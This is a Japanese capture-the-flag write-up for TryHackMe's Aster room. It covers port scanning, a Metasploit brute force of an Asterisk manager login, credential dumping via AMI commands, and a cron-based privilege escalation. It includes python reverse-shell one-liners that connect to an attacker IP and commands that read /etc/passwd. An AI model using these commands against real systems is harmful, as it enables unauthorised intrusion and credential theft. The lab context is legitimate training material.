# Aster CTF

https://tryhackme.com/room/aster

## Enumeration

```shell
TARGET=10.201.42.247
sudo bash -c "echo $TARGET   aster.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 60
80/tcp   open  http       syn-ack ttl 60
1720/tcp open  h323q931   syn-ack ttl 60
2000/tcp open  cisco-sccp syn-ack ttl 60
5038/tcp open  unknown    syn-ack ttl 60
```

```sh
$ sudo nmap -sS -sV -p22,80,1720,2000,5038 $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-09 16:42 JST
Nmap scan report for aster.thm (10.201.42.247)
Host is up (0.19s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
1720/tcp open  h323q931?
2000/tcp open  cisco-sccp?
5038/tcp open  asterisk    Asterisk Call Manager 5.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ディレクトリ列挙

```sh
dirb http://$TARGET
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt -u http://$TARGET -w ./dirlist.txt -t 64 -k
```

何も出ない。

## pyc

pycファイルをトップページからダウンロード可能。

```sh
$ file ./output.pyc                                                                                                   
./output.pyc: python 2.7 byte-compiled
```

hex2asciiで文字列を取り出す。

```
Good job, user "admin" the open source framework for building communications, installed in the server.
```

```
Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
```

他のpycは出てこなかった。

```sh
ffuf -u http://aster.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .pyc
```

## asterisk

metasploit で、adminユーザーのパスワードをブルートフォース成功。

```sh
msf6 auxiliary(voip/asterisk_login) > set RHOSTS 10.201.42.247
RHOSTS => 10.201.42.247
msf6 auxiliary(voip/asterisk_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(voip/asterisk_login) > run

[+] 10.201.42.247:5038    - User: "admin" using pass: "[REDACTED]" - can login on 10.201.42.247:5038!
```

下記で使えるコマンドが出てくる。

```sh
$ nc $TARGET 5038
Asterisk Call Manager/5.0.2
ACTION: LOGIN
USERNAME: admin
SECRET: [REDACTED]

Response: Success
Message: Authentication accepted
ACTION: LOGIN
USERNAME: admin
SECRET: abc123

ACTION: LISTCOMMANDS
```

シェルコマンド実行を試したが、悪用成功しなかった。

```sh
action:command
command:! ls

action:command
command:! cat /etc/passwd

action:command
command: ! python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.85.243",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

Response: Success
Message: Command output follows
Output: 

action:command
command: ! python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.13.85.243",6666));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'

Response: Success
Message: Command output follows
Output: 
```

Base64のようなシークレットが出てきた。デコードするとバイナリになって使用できるか不明。

```sh
action:command
command:database show

Response: Success
Message: Command output follows
Output: /dundi/secret                                     : r9cELrSqsjN45WY+91k1Nw==;57R6SXx3rBe30CVVN+pHPA==
Output: /dundi/secretexpiry                               : 1754796290               
Output: /pbx/UUID                                         : 50593f69-760d-418e-9569-28aca2b73728
```

パスワードが出てきた。これでSSH接続できた。

```sh
action:command
command: sip show users

Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No        
Output: 101                        101                               test             No   No        
Output: harry                      [REDACTED]                       test             No   No
```

## 権限昇格

rootのcronジョブ。run.sh の内容は不明。

```sh
harry@ubuntu:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
*  *    * * *   root    cd /opt/ && bash ufw.sh
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /root/java/ && bash run.sh
```

harryのホームに置かれているjarファイルをkaliにコピーして解析する

```sh
harry@ubuntu:~$ ls
Example_Root.jar  user.txt
```

jd-guiでリバース

```java
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class Example_Root {
  public static boolean isFileExists(File paramFile) {
    return paramFile.isFile();
  }
  
  public static void main(String[] paramArrayOfString) {
    String str = "/tmp/flag.dat";
    File file = new File(str);
    try {
      if (isFileExists(file)) {
        FileWriter fileWriter = new FileWriter("/home/harry/root.txt");
        fileWriter.write("my secret <3 baby");
        fileWriter.close();
        System.out.println("Successfully wrote to the file.");
      } 
    } catch (IOException iOException) {
      System.out.println("An error occurred.");
      iOException.printStackTrace();
    } 
  }
}
```

cronとjarのつながりがよく分からない。

試しにリンクを作ったが効果なし。

```sh
harry@ubuntu:~$ ln -s /root/root.txt /tmp/flag.dat
```

`/tmp/flag.dat` が存在したらシークレットを書き込むという条件なので、ファイルを作ってみる。

```sh
harry@ubuntu:~$ touch /tmp/flag.dat
```

root.txt が書き込まれた。

```sh
harry@ubuntu:~$ ls -al
total 56
drwxr-xr-x 5 harry harry    4096 Aug 12 01:54 .
drwxr-xr-x 3 root  root     4096 Aug 10  2020 ..
-rw------- 1 root  asterisk  171 Aug 10  2020 .asterisk_history
-rw------- 1 root  root     3117 Aug 12  2020 .bash_history
-rw-r--r-- 1 harry harry     220 Aug 10  2020 .bash_logout
-rw-r--r-- 1 harry harry    3771 Aug 10  2020 .bashrc
drwx------ 2 harry harry    4096 Aug 10  2020 .cache
-rw-rw-r-- 1 harry harry    1094 Aug 12  2020 Example_Root.jar
drwxrwxr-x 2 harry harry    4096 Aug 10  2020 .nano
-rw-r--r-- 1 harry harry     655 Aug 10  2020 .profile
-rw-r--r-- 1 root  root       24 Aug 12 01:54 root.txt
drwxr-xr-x 3 root  root     4096 Aug 10  2020 .subversion
-rw-r--r-- 1 harry harry       0 Aug 10  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 harry harry      32 Aug 11  2020 user.txt
-rw-r--r-- 1 root  root      233 Aug 12  2020 .wget-hsts
```

## 振り返り

- Asterisk と jd-gui を初めて使う機会になったところが良かった
